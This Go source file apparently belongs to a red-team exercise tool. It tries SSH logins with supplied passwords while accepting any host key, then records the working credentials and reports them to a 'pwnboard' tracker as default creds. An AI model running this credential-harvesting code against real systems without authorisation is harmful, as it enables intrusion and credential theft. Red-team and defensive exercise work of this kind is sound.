package sshClient

import (
	"fmt"
	"net"
	"sync"
	"time"

	"github.com/opt/red-script/internal/files"
	"github.com/opt/red-script/internal/pwnboard"
	"golang.org/x/crypto/ssh"
)

func Connect(host, user, password string, wg *sync.WaitGroup) {
	defer wg.Done()
	sshConfig := &ssh.ClientConfig{
		User: user,
		Auth: []ssh.AuthMethod{
			ssh.Password(password),
		},
		HostKeyCallback: ssh.HostKeyCallback(func(hostname string, remote net.Addr, key ssh.PublicKey) error { return nil }),
		Timeout:         30 * time.Second,
	}

	conn, err := ssh.Dial("tcp", host, sshConfig)
	if err != nil {
		return
	}

	fmt.Println("Successful SSH connection @", host)

	conn.Close()

	files.WriterChan <- fmt.Sprintf("ssh:%s:%s:%s\n", host, user, password)
	ip := host
	info := "ssh:" + user + ":" + password + ":Default Creds"
	pwnboard.SendUpdate(ip, info)
}
